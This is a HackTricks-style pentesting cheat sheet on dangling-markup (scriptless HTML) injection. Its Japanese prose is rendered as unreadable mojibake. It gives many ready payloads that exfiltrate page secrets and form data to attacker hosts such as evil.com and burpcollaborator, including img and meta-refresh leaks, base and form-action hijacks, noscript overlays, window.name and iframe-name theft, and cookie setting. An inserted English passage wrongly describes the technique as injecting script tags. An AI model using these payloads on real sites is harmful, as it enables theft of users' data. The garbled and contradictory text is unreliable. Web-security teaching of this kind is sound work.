# ãƒ€ãƒ³ã‚°ãƒªãƒ³ã‚°ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ— - HTMLã‚¹ã‚¯ãƒªãƒ—ãƒˆãƒ¬ã‚¹ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## æ¦‚è¦

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**HTMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹**ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€[**XSS** ](xss-cross-site-scripting/)ã‚’**æ‚ªç”¨ã™ã‚‹æ–¹æ³•ãŒè¦‹ã¤ã‹ã‚‰ãªã„**å ´åˆã«éå¸¸ã«ä¾¿åˆ©ã§ã™ãŒã€ã„ãã¤ã‹ã®HTMLã‚¿ã‚°ã‚’**ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã‚‹**å ´åˆã§ã™ã€‚\
ã¾ãŸã€HTMLå†…ã«**å¹³æ–‡ã§ä¿å­˜ã•ã‚ŒãŸç§˜å¯†**ãŒã‚ã‚‹å ´åˆã«ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‹ã‚‰ãã‚Œã‚’**å¤–éƒ¨ã«æŒã¡å‡ºã™**ãŸã‚ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚ã¾ãŸã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’èª¤èªã•ã›ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚

ã“ã“ã§ã‚³ãƒ¡ãƒ³ãƒˆã•ã‚Œã¦ã„ã‚‹ã„ãã¤ã‹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€äºˆæœŸã—ãªã„æ–¹æ³•ã§æƒ…å ±ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ã“ã¨ã«ã‚ˆã£ã¦ã€ã„ãã¤ã‹ã®[**ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼**](content-security-policy-csp-bypass/)ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼ˆhtmlã‚¿ã‚°ã€CSSã€http-metaã‚¿ã‚°ã€ãƒ•ã‚©ãƒ¼ãƒ ã€baseãªã©ï¼‰ã€‚

## ä¸»ãªå¿œç”¨

### å¹³æ–‡ã®ç§˜å¯†ã®ç›—ã¿å‡ºã—

`<img src='http://evil.com/log.cgi?`ã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã™ã‚‹ã¨ã€ãƒšãƒ¼ã‚¸ãŒèª­ã¿è¾¼ã¾ã‚ŒãŸã¨ãã«è¢«å®³è€…ã¯ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã•ã‚ŒãŸ`img`ã‚¿ã‚°ã¨æ¬¡ã®ã‚¯ã‚©ãƒ¼ãƒˆå†…ã®ã‚³ãƒ¼ãƒ‰ã®é–“ã®ã™ã¹ã¦ã®ã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚ãã®ãƒãƒ£ãƒ³ã‚¯ã«ç§˜å¯†ãŒä½•ã‚‰ã‹ã®æ–¹æ³•ã§å­˜åœ¨ã™ã‚‹å ´åˆã€ãã‚Œã‚’ç›—ã¿ã¾ã™ï¼ˆåŒã˜ã“ã¨ã‚’ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã©ã¡ã‚‰ãŒã‚ˆã‚Šèˆˆå‘³æ·±ã„ã‹ã‚’è¦‹ã¦ã¿ã¦ãã ã•ã„ï¼‰ã€‚

`img`ã‚¿ã‚°ãŒç¦æ­¢ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼ˆCSPã®ãŸã‚ãªã©ï¼‰ã€`<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€**Chromeã¯** "<" **ã¾ãŸã¯** "\n" **ã‚’å«ã‚€HTTP URLã‚’ãƒ–ãƒ­ãƒƒã‚¯**ã—ã¾ã™ã®ã§ã€"ftp" ã®ã‚ˆã†ãªä»–ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚¹ã‚­ãƒ¼ãƒ ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€CSSã®`@import`ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆ";"ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§ã®ã™ã¹ã¦ã®ã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ï¼‰ã€‚
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
ã‚ãªãŸã¯**`<table`**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
ã‚ãªãŸã¯`<base`ã‚¿ã‚°ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚å¼•ç”¨ç¬¦ãŒé–‰ã˜ã‚‰ã‚Œã‚‹ã¾ã§ã€ã™ã¹ã¦ã®æƒ…å ±ãŒé€ä¿¡ã•ã‚Œã¾ã™ãŒã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œãŒå¿…è¦ã§ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€ãƒ™ãƒ¼ã‚¹ã‚¿ã‚°ãŒãƒªãƒ³ã‚¯ãŒæŒ‡ã™ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’å¤‰æ›´ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ï¼‰:
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### ãƒ•ã‚©ãƒ¼ãƒ ã®ç›—ã¿å‡ºã—

When conducting a web application penetration test, it is important to identify and exploit any vulnerabilities that may exist in the application's forms. One such vulnerability is known as "dangling markup" or "HTML scriptless injection."

Web forms are commonly used to collect user input, such as login credentials or personal information. In some cases, the form data is not properly sanitized or validated on the server side, allowing an attacker to inject malicious code into the form fields.

HTML scriptless injection is a technique that takes advantage of this vulnerability by injecting HTML tags into the form fields. These tags are designed to execute JavaScript code when the form is submitted, allowing the attacker to steal sensitive information or perform other malicious actions.

To exploit this vulnerability, the attacker needs to identify a form that is vulnerable to HTML scriptless injection. This can be done by manually inspecting the HTML source code of the web application or by using automated scanning tools.

Once a vulnerable form is identified, the attacker can inject HTML tags into the form fields. For example, the attacker may inject a `<script>` tag with JavaScript code that captures the form data and sends it to a remote server controlled by the attacker.

To prevent HTML scriptless injection attacks, web developers should ensure that all user input is properly sanitized and validated on the server side. This includes checking for and removing any HTML tags or special characters that could be used to inject malicious code.

Additionally, web application firewalls (WAFs) can be used to detect and block HTML scriptless injection attacks. WAFs can analyze incoming requests and block any requests that contain suspicious or malicious code.

By understanding and exploiting vulnerabilities like HTML scriptless injection, penetration testers can help organizations identify and fix security flaws in their web applications, protecting sensitive user data from being stolen or misused.
```markup
<base href='http://evil.com/'>
```
æ¬¡ã«ã€ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ‘ã‚¹ã«é€ä¿¡ã™ã‚‹ãƒ•ã‚©ãƒ¼ãƒ ï¼ˆä¾‹ï¼š`<form action='update_profile.php'>`ï¼‰ã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’æ‚ªæ„ã®ã‚ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã«é€ä¿¡ã—ã¾ã™ã€‚

### ãƒ•ã‚©ãƒ¼ãƒ ã®ç›—ã¿å‡ºã—2

ãƒ•ã‚©ãƒ¼ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®šã—ã¾ã™ï¼š`<form action='http://evil.com/log_steal'>` ã“ã‚Œã«ã‚ˆã‚Šã€æ¬¡ã®ãƒ•ã‚©ãƒ¼ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ãŒä¸Šæ›¸ãã•ã‚Œã€ãƒ•ã‚©ãƒ¼ãƒ ã®ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãŒæ”»æ’ƒè€…ã«é€ä¿¡ã•ã‚Œã¾ã™ã€‚

### ãƒ•ã‚©ãƒ¼ãƒ ã®ç›—ã¿å‡ºã—3

ãƒœã‚¿ãƒ³ã¯ã€å±æ€§ "formaction" ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ•ã‚©ãƒ¼ãƒ ã®æƒ…å ±ãŒé€ä¿¡ã•ã‚Œã‚‹URLã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’ä½¿ã£ã¦æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚¯ãƒªã‚¢ãƒ†ã‚­ã‚¹ãƒˆã®ç§˜å¯†ã®ç›—ã¿å‡ºã— 2

æœ€æ–°ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’ç›—ã‚€ï¼ˆæ–°ã—ã„ãƒ•ã‚©ãƒ¼ãƒ ãƒ˜ãƒƒãƒ€ã‚’æ³¨å…¥ã™ã‚‹ï¼‰å¾Œã€æ–°ã—ã„å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```markup
<input type='hidden' name='review_body' value="
```
ãã—ã¦ã€ã“ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ã¯ã€HTMLå†…ã®ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆã¨æ¬¡ã®ãƒ€ãƒ–ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆã®é–“ã®ã™ã¹ã¦ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã®æ”»æ’ƒã¯ã€"_**å¹³æ–‡ã®ç§˜å¯†ã®ç›—ã¿å‡ºã—**_"ã¨"_**ãƒ•ã‚©ãƒ¼ãƒ ã®ç›—ã¿å‡ºã—2**_"ã‚’çµ„ã¿åˆã‚ã›ã¦ã„ã¾ã™ã€‚

åŒã˜ã“ã¨ã‚’ã€ãƒ•ã‚©ãƒ¼ãƒ ã¨`<option>`ã‚¿ã‚°ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ã‚‚ã§ãã¾ã™ã€‚é–‰ã˜ã‚‰ã‚ŒãŸ`</option>`ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§ã®ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### ãƒ•ã‚©ãƒ¼ãƒ ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

ãƒ•ã‚©ãƒ¼ãƒ ã®ãƒ‘ã‚¹ã‚’å¤‰æ›´ã—ã€æ–°ã—ã„å€¤ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§ã€äºˆæœŸã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒå®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### noscriptã‚’ä½¿ç”¨ã—ãŸå¹³æ–‡ã®ç§˜å¯†æƒ…å ±ã®ç›—ã¿å‡ºã—

`<noscript></noscript>`ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒJavaScriptã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„å ´åˆã«è§£é‡ˆã•ã‚Œã‚‹ã‚¿ã‚°ã§ã™ï¼ˆChromeã§ã¯[chrome://settings/content/javascript](chrome://settings/content/javascript)ã§JavaScriptã‚’æœ‰åŠ¹/ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚

æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚µã‚¤ãƒˆã«ã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ãƒšãƒ¼ã‚¸ã®æœ€ä¸‹éƒ¨ã¾ã§ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç›—ã¿å‡ºã™æ–¹æ³•ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ã§ã™ï¼š
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œã‚’åˆ©ç”¨ã—ã¦CSPã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹

ã“ã®[ãƒãƒ¼ãƒˆã‚¹ã‚¦ã‚£ã‚¬ãƒ¼ã®ç ”ç©¶](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)ã‹ã‚‰ã€**æœ€ã‚‚CSPãŒåˆ¶é™ã•ã‚ŒãŸ**ç’°å¢ƒã§ã‚‚ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œ**ã‚’åˆ©ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’**å¤–éƒ¨ã«æ¼æ´©**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ä»Šå›ã¯ã€ä»¥ä¸‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**è¢«å®³è€…**ã«å¯¾ã—ã¦ã€ã‚ãªãŸãŒåˆ¶å¾¡ã™ã‚‹**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã«**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã™ã‚‹**ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯**ã™ã‚‹ã‚ˆã†ã«ä¾é ¼ã—ã¾ã™ã€‚ã¾ãŸã€**`base`**ã‚¿ã‚°å†…ã®**`target`**å±æ€§ã«ã¯ã€æ¬¡ã®ã‚·ãƒ³ã‚°ãƒ«ã‚¯ã‚©ãƒ¼ãƒˆã¾ã§ã®**HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„**ãŒå«ã¾ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚\
ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªãƒ³ã‚¯ãŒã‚¯ãƒªãƒƒã‚¯ã•ã‚ŒãŸå ´åˆã®**`window.name`**ã®**å€¤**ã¯ã€ãã®**HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„**å…¨ä½“ã«ãªã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦è¢«å®³è€…ãŒã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã„ã‚‹ãƒšãƒ¼ã‚¸ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ãŸã‚ã€**`window.name`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãã®ãƒ‡ãƒ¼ã‚¿ã‚’**å¤–éƒ¨ã«æ¼æ´©**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### èª¤è§£ã‚’æ‹›ãã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼1 - HTMLãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹æ”»æ’ƒ

æ¬¡ã®ã‚¿ã‚°ã‚’ä¸Šæ›¸ãã—ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒ•ãƒ­ãƒ¼ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹å€¤ã‚’æŒã¤ã€HTMLå†…ã«æ–°ã—ã„ã‚¿ã‚°ã‚’æŒ¿å…¥ã—ã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€æƒ…å ±ã‚’å…±æœ‰ã™ã‚‹ç›¸æ‰‹ã‚’é¸æŠã—ã¾ã™ã€‚

```html
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>
    var target = document.getElementById('target');
    var shareWith = target.getAttribute('data-share-with');
    // Perform actions based on the value of 'shareWith'
  </script>
</svg>

<div id="target" data-share-with="example@example.com"></div>
```

ã“ã®æ”»æ’ƒã§ã¯ã€`data-share-with`å±æ€§ã®å€¤ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒ•ãƒ­ãƒ¼ã‚’æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### èª¤è§£ã‚’æ‹›ãã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼2 - ã‚¹ã‚¯ãƒªãƒ—ãƒˆåå‰ç©ºé–“æ”»æ’ƒ

HTMLã‚¿ã‚°ã‚’æŒ¿å…¥ã—ã¦JavaScriptã®åå‰ç©ºé–“å†…ã«å¤‰æ•°ã‚’ä½œæˆã—ã¾ã™ã€‚ãã®å¾Œã€ã“ã®å¤‰æ•°ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ•ãƒ­ãƒ¼ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ã€‚
```markup
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### JSONPã®ä¹±ç”¨

JSONPã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€ä»»æ„ã®é–¢æ•°ã¨ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```markup
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
ã¾ãŸã¯ã€ã„ãã¤ã‹ã®JavaScriptã‚’å®Ÿè¡Œã—ã¦ã¿ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframeã®æ‚ªç”¨

æ³¨æ„ã—ã¦ãã ã•ã„ã€**å­ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯è¦ªã®locationãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¡¨ç¤ºãŠã‚ˆã³è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚** ã“ã‚Œã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒä»–ã®ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã‚’**iframe**å†…ã«èª­ã¿è¾¼ã‚€ã“ã¨ã§ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒä»–ã®ãƒšãƒ¼ã‚¸ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
ã“ã‚Œã¯æ¬¡ã®ã‚ˆã†ã«ç·©å’Œã§ãã¾ã™: _**sandbox='allow-scripts allow-top-navigation'**_

ã¾ãŸã€iframeã‚’ä½¿ã£ã¦ç•°ãªã‚‹ãƒšãƒ¼ã‚¸ã‹ã‚‰**iframeã®nameå±æ€§ã‚’åˆ©ç”¨ã—ã¦**æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€HTMLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦è‡ªèº«ã‚’iframeåŒ–ã™ã‚‹iframeã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€**æ©Ÿå¯†æƒ…å ±ãŒiframeã®nameå±æ€§å†…ã«è¡¨ç¤ºã•ã‚Œã€ãã‚Œã‚’åˆæœŸã®iframeã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹**ã‹ã‚‰ã§ã™ã€‚
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### \<metaã®ä¹±ç”¨

**`meta http-equiv`**ã‚’ä½¿ç”¨ã—ã¦ã€Cookieã®è¨­å®šãªã©ã®**è¤‡æ•°ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š`<meta http-equiv="Set-Cookie" Content="SESSID=1">`ã¾ãŸã¯ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ï¼ˆã“ã®å ´åˆã¯5ç§’å¾Œã«ï¼‰ï¼š`<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

ã“ã‚Œã¯ã€**http-equiv**ã«é–¢ã™ã‚‹**CSP**ã§å›é¿ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ `Content-Security-Policy: default-src 'self';`ã¾ãŸã¯ `Content-Security-Policy: http-equiv 'self';`ï¼‰

### æ–°ã—ã„\<portal HTMLã‚¿ã‚°

\<portalã‚¿ã‚°ã®è„†å¼±æ€§ã«é–¢ã™ã‚‹éå¸¸ã«**èˆˆå‘³æ·±ã„ç ”ç©¶**ã¯[ã“ã¡ã‚‰](https://research.securitum.com/security-analysis-of-portal-element/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã®åŸ·ç­†æ™‚ç‚¹ã§ã¯ã€Chromeã§portalã‚¿ã‚°ã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚`chrome://flags/#enable-portals`ã§æœ‰åŠ¹ã«ã—ãªã„ã¨æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚
```markup
<portal src='https://attacker-server?
```
### HTMLãƒªãƒ¼ã‚¯

